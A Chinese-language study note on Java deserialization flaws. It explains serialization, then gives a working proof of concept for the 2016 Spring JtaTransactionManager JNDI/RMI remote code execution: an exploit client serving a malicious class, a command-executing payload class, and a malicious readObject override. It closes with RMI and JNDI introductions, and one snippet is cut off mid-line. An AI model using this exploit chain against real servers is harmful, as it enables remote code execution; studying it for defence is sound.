# 反序列化漏洞-Java

- [反序列化漏洞-Java](#反序列化漏洞-java)
  - [1 漏洞成因](#1-漏洞成因)
  - [2 Spring 框架的反序列化漏洞](#2-spring-框架的反序列化漏洞)
  - [3 RMI简介](#3-rmi简介)
  - [4 JNDI简介](#4-jndi简介)
  - [5 Reference](#5-reference)

Java序列化：Java对象->字节序列，`ObjectOutputStream`类的`writeObject()`方法实现序列化

Java反序列化：字节序列->Java对象，`ObjectInputStream`类的`readObject()`方法实现反序列化

序列化与反序列化是让Java对象脱离Java运行环境的手段，可以有效的实现多平台之间的通信、对象持久化存储。

主要的应用场景：

- http：多平台之间的通信、管理等
- RMI：是Java的一组拥护开发分布式应用的API，实现了不同OS之间的方法调用。值得注意的是，RMI的传输100%基于反序列化，Java RMI的默认端口是1099.
- JMX：是一套标准的代理和服务。用户可以在任何Java程序中使用JMX实现管理，weblogic的管理页面就是基于JMX开发的，而JBoss则整个系统都基于JMX构架。

## 1 漏洞成因

暴露了反序列化的API，导致用户可以操作传入的数据，攻击者可以精心构造反序列化对象执行恶意代码。

实现序列化与反序列化

```java
public class test{
    public static void main(String args[])throws Exception{
          //定义obj对象
        String obj="hello world!";
          //创建一个包含对象进行反序列化信息的”object”数据文件
        FileOutputStream fos=new FileOutputStream("object");
        ObjectOutputStream os=new ObjectOutputStream(fos);
          //writeObject()方法将obj对象写入object文件
        os.writeObject(obj);
        os.close();
          //从文件中反序列化obj对象
        FileInputStream fis=new FileInputStream("object");
        ObjectInputStream ois=new ObjectInputStream(fis);
          //恢复对象
        String obj2=(String)ois.readObject();
        System.out.print(obj2);
        ois.close();
    }
}
```

上面代码将 String 对象 obj1 序列化后写入文件 object 文件中，后又从该文件反序列化得到该对象。我们来看一下 object 文件中的内容：

<img src="https://images.seebug.org/content/images/2017/06/14968351249563.png-w331s" width=60%>

注意：`ac ed 00 05`是Java序列化内容的特征，如果经过base64编码则为`rO0ABQ==`

<img src="https://images.seebug.org/content/images/2017/06/14968351356529.png-w331s" width=60%>

**再来看一段代码**

Test1.Java

```java
public class Test1 {
    public static void main(String[] args) throws  Exception {
        MyObject myObj = new MyObject();
        myObj.name = "hi";

        // 创建object1数据文件
        FileOutputStream fos = new FileOutputStream("object1");
        ObjectOutputStream os = new ObjectOutputStream(fos);

        os.writeObject(myObj);
        os.close();

        FileInputStream fis = new FileInputStream("object1");
        ObjectInputStream ois = new ObjectInputStream(fis);

        // 恢复对象
        MyObject objectFromDisk = (MyObject)ois.readObject();
        System.out.println(objectFromDisk.name);
        ois.close();
    }
}

class MyObject implements Serializable{
    public String name;

    private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException{
        in.defaultReadObject();
        Runtime.getRuntime().exec("open /Applications/Pages.app/");
    }
}
```

以上代码重点在于：重写了`readObject()`方法。

另外，一个对象要想可以(反)序列化，必须实现`Serializable`接口。

---

看完你可能会觉得，怎么会有小傻逼这么写？当然不会，但也不会太差。

## 2 Spring 框架的反序列化漏洞

我们看一下 2016 年的 Spring 框架的反序列化漏洞，该漏洞是利用了 RMI 以及 JNDI：

> RMI：Java远程方法调用，用于实现远程过程调用的API接口，常见的两种接口实现为JRMP(Java Remote Message Protocol ，Java 远程消息交换协议)以及 CORBA。
>
> JNDI：一个应用程序设计的 API，为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口。JNDI 支持的服务主要有以下几种：DNS、LDAP、 CORBA 对象服务、RMI 等。

废话不多说，先来看代码。

**ExploitableServer.java**

```java
import java.io.ObjectInputStream;
import java.net.ServerSocket;
import java.net.Socket;

public class ExploitableServer {
    public static void main(String[] args) throws Exception{
        ServerSocket serverSocket = new ServerSocket((Integer.parseInt("9999")));
        System.out.println("Server started on port "+serverSocket.getLocalPort());

        // handle
        while (true){
            Socket socket = serverSocket.accept();
            System.out.println("Connection received from "+socket.getInetAddress());
            ObjectInputStream ois = new ObjectInputStream(socket.getInputStream());

            try {
                Object obj = ois.readObject();
                System.out.println("Read object "+obj);
            } catch (Exception e){
                System.out.println("Exception caught while reading object");
                e.printStackTrace();
            }

        }
    }
}

```

这部分代码很简单，就是创建socket，然后监听端口，接收这个端口的请求数据，然对这些数据进行反序列化。

**ExploitClient.java**

```java
public class ExploitClient {
    public static void main(String[] args) {
        try {
            String serverAddress = args[0];
            int port = Integer.parseInt(args[1]);
            String localAddress= args[2];
            //启动web server，提供远程下载要调用类的接口
            System.out.println("Starting HTTP server");
            HttpServer httpServer = HttpServer.create(new InetSocketAddress(8088), 0);
            httpServer.createContext("/",new HttpFileHandler());
            httpServer.setExecutor(null);
            httpServer.start();
            //下载恶意类的地址 http://127.0.0.1:8088/ExportObject.class
            System.out.println("Creating RMI Registry");
            Registry registry = LocateRegistry.createRegistry(1099);
            Reference reference = new javax.naming.Reference("ExportObject","ExportObject","http://"+serverAddress+"/");
            ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(reference);
            registry.bind("Object", referenceWrapper);

            System.out.println("Connecting to server "+serverAddress+":"+port);
            Socket socket=new Socket(serverAddress,port);
            System.out.println("Connected to server");
            //jndi的调用地址
            String jndiAddress = "rmi://"+localAddress+":1099/Object";
            org.springframework.transaction.jta.JtaTransactionManager object = new org.springframework.transaction.jta.JtaTransactionManager();
            object.setUserTransactionName(jndiAddress);
            //发送payload
            System.out.println("Sending object to server...");
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(socket.getOutputStream());
            objectOutputStream.writeObject(object);
            objectOutputStream.flush();
            while(true) {
                Thread.sleep(1000);
            }
        } catch(Exception e) {
            e.printStackTrace();
        }
    }
}
```

以上代码，启动一个http服务，创建RMI registry，其中用到了`ExportObject`。

然后在某个端口创建socket，创建`JtaTransactionManager`类的实例object，再调用其`setUserTransactionName`方法。之后将object序列化发送到服务端。

**ExportObject.java**

```java
public class ExportObject {
   public static String exec(String cmd) throws Exception {
      String sb = "";
      BufferedInputStream in = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());
      BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
      String lineStr;
      while ((lineStr = inBr.readLine()) != null)
         sb += lineStr + "\n";
      inBr.close();
      in.close();
      return sb;
   }
   public ExportObject() throws Exception {
      String cmd="open /Applications/Calculator.app/";
      throw new Exception(exec(cmd));
   }
}
```

我们自己构造的一个可导出的恶意类。

**Spring框架中的JNDI反序列化漏洞**

问题点当然在于`readObject()`方法，我们来跟进一下。

*(有问题的类是`org.springframework.transaction.jta.JtaTransactionManager`*

```java
private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        ois.defaultReadObject();
        this.jndiTemplate = new JndiTemplate();
        this.initUserTransactionAndTransactionManager();
        this.initTransactionSynchronizationRegistry();
}
```

接着跟进`initUserTransactionAndTransactionManager()`方法。

```java
protected void initUserTransactionAndTransactionManager() throws TransactionSystemException {
    if (this.userTransaction == null) {
        if (StringUtils.hasLength(this.userTransactionName)) {
            this.userTransaction = this.lookupUserTransaction(this.userTransactionName);
            this.userTransactionObtainedFromJndi = true;
        } else {
            this.userTransaction = this.retrieveUserTransaction();
            if (this.userTransaction == null && this.autodetectUserTransaction) {
                this.userTransaction = this.findUserTransaction();
            }
        }
    }

```

接着跟进`lookupUserTransaction()`方法。

```java
protected UserTransaction lookupUserTransaction(String userTransactionName) throws TransactionSystemException {
    try {
        if (this.logger.isDebugEnabled()) {
            this.logger.debug("Retrieving JTA UserTransaction from JNDI location [" + userTransactionName + "]");
        }

        return (UserTransaction)this.getJndiTemplate().lookup(userTransactionName, UserTransaction.class);
    } catch (NamingException var3) {
        throw new TransactionSystemException("JTA UserTransaction is not available at JNDI location [" + userTransactionName + "]", var3);
    }
}
```

继续跟进`lookup()`方法。

```java
public Object lookup(final String name) throws NamingException {
    if (this.logger.isDebugEnabled()) {
        this.logger.debug("Looking up JNDI object with name [" + name + "]");
    }

    return this.execute(new JndiCallback<Object>() {
        public Object doInContext(Context ctx) throws NamingException {
            Object located = ctx.lookup(name);
            if (located == null) {
                throw new NameNotFoundException("JNDI object with [" + name + "] not found: JNDI implementation returned null");
            } else {
                return located;
            }
        }
    });
}
```

跟进`execute()`方法。

```java
public <T> T execute(JndiCallback<T> contextCallback) throws NamingException {
        Context ctx = this.getContext();

        Object var3;
        try {
            var3 = contextCallback.doInContext(ctx);//此处触发RCE
        } finally {
            this.releaseContext(ctx);
        }

        return var3;
    }
```

`var3 = contextCallback.doInContext(ctx);`这句话最终会触发RCE。

**总结**：

其实重点在于，`jndiAddress`这个参数用户可控，只要将之设置为一个远程的RMI地址，并且远程服务器上注册了这个类，`ExploitServer`端就会调用这个类的构造函数，从而RCE。

> 问题：我怎么知道最后lookup函数回调用构造方法呢？是因为会实例化某个类吗？



## 3 RMI简介

非常类似Go的rpc，毕竟两者都是调用远程方法。

go的rpc，以简单的kite为例，启一个kite服务，自定义一个符合某种函数签名的函数，然后注册。

然后client和服务端dial，通过方法名调用即可。



Java的rmi大致过程如下：

自定义一个远程的interface，这个接口一定要继承自`remote`；然后定义一个类A去实现这个interface。

创建`registry`；server端创建stub，并使用`registry`将名字和stub绑定。

client端使用registry获得stub，然后调用stub的方法。

*示例代码如下：*

**定义一个远程interface**

```java
package com.luckyqiao.rmi;

import java.rmi.Remote;
import java.rmi.RemoteException;

public interface RemoteHello extends Remote {
    String sayHello(String name) throws RemoteException;
}
```

要想一个interface可以被远程调用，它一定要继承自接口`Remote`。然后里面的`sayHello`是我们想要可以远程调用的method。

> 以下抛出异常的部分我还不太懂

**定义class去实现远程interface**

```java
import java.rmi.RemoteException;

public class RemoteHelloImpl implements RemoteHello{
    public String sayHello(String name) throws RemoteException{
        return String.format("Hello, %s!", name);
    }
}
```

上一步定义好了我们的远程interface后，这部分定义了`RemoteHelloImpl`类去实现接口，其实也就是实现接口中的远程method。

**创建registry**

```java
package com.luckyqiao.rmi;

import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.util.concurrent.CountDownLatch;

public class RegistryServer {
    public static void main(String[] args) throws InterruptedException{
        try {
            LocateRegistry.createRegistry(8000); //Registry使用8000端口
        } catch (RemoteException e) {
            e.printStackTrace();
        }

        CountDownLatch latch=new CountDownLatch(1);
        latch.await();  //挂起主线程，否则应用会退出
    }
}
```

以上代码，是在本机创建了一个`registry`实例，可以在某个特定port接收请求。

`registry`是一个远程的接口，远程object可以通过它来进行注册。

**创建RMI server**

```java
package com.luckyqiao.rmi;

import java.io.IOException;
import java.rmi.AlreadyBoundException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.UnicastRemoteObject;

public class RMIServer {

    public static void main(String[] args) {

        RemoteHello remoteHello = new RemoteHelloImpl();
        try {
            RemoteHello stub = (RemoteHello) UnicastRemoteObject.exportObject(remoteHello, 4000); //导出服务，使用4000端口
            Registry registry = LocateRegistry.getRegistry("127.0.0.1", 8000); //获取Registry
            registry.bind("hello", stub); //使用名字hello，将服务注册到Registry
        } catch (AlreadyBoundException | IOException e) {
            e.printStackTrace();
        }

    }
}
```

以上代码，通过`exportObject`方法，来将远程对象导出(exports)。然后通过`getRegistry`方法获取之前已经创建的`registry`，接着通过`bind`方法，将导出的服务和一个名称(String)绑定。

这样client端就可以通过查找字符串来找到对应的obj，然后远程调用它的method。

**创建RMI client**

```java
package com.luckyqiao.study.rmi;

import java.rmi.NotBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIClient {
    public static void main(String[] args) {
        try {
            Registry registry = LocateRegistry.getRegistry("127.0.0.1", 8000);  //获取注册中心引用
            RemoteHello remoteHello = (RemoteHello) registry.lookup("hello"); //获取RemoteHello服务
            System.out.println(remoteHello.sayHello("World"));  //调用远程方法
        } catch (RemoteException | NotBoundException e) {
            e.printS
```

以上代码，获取到之前创建的`registry`，然后使用它的`lookup`函数，通过name来寻找对应的导出stub。

然后调用stub的方法即可。

## 4 JNDI简介

JNDI是一组在Java应用中访问命名和目录服务的API，使得我们可以通过名称去查询数据源从而访问需要的对象。

> 感觉很类似rmi，rmi可以通过name访问某个obj的方法；
>
> jndi可以通过name访问文件、数据库、dns等服务。

## 5 Reference

- [seebug-深入理解 JAVA 反序列化漏洞](https://paper.seebug.org/312/)
- [java rmi 使用教程及原理]


 
